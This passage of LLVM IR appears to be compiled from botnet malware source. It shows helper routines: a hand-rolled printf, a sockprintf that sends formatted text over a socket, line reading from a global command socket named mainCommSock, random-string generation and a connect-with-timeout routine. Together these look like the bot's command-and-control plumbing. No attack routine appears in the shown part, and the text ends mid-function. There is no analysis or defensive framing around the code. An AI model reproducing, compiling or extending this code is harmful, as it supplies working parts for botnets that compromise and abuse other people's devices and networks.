; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.485, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #9
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #9
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %86

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %85

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %57, i64 0, i64 0
  %59 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %58) #5, !srcloc !3
  %60 = extractvalue { i64, i64* } %59, 0
  %61 = extractvalue { i64, i64* } %59, 1
  %62 = trunc i64 %60 to i32
  store i32 %62, i32* %14, align 4
  %63 = ptrtoint i64* %61 to i64
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %15, align 4
  br label %65

; <label>:65:                                     ; preds = %56
  %66 = load i32, i32* %5, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %71 = load i32, i32* %5, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %79, i32* %12, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %50

; <label>:84:                                     ; preds = %65
  br label %85

; <label>:85:                                     ; preds = %84, %50
  br label %86

; <label>:86:                                     ; preds = %85, %33
  store i32 0, i32* %18, align 4
  %87 = load i8*, i8** %6, align 8
  store i8* %87, i8** %17, align 8
  br label %88

; <label>:88:                                     ; preds = %106, %86
  %89 = load i32, i32* %7, align 4
  %90 = add nsw i32 %89, -1
  store i32 %90, i32* %7, align 4
  %91 = icmp sgt i32 %89, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i64 @recv(i32 %93, i8* %16, i64 1, i32 0)
  %95 = icmp ne i64 %94, 1
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %92
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  store i32 -1, i32* %4, align 4
  br label %112

; <label>:98:                                     ; preds = %92
  %99 = load i8, i8* %16, align 1
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %17, align 8
  store i8 %99, i8* %100, align 1
  %102 = load i8, i8* %16, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %18, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %18, align 4
  br label %88

; <label>:109:                                    ; preds = %105, %88
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  %111 = load i32, i32* %18, align 4
  store i32 %111, i32* %4, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %96
  %113 = load i32, i32* %4, align 4
  ret i32 %113
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
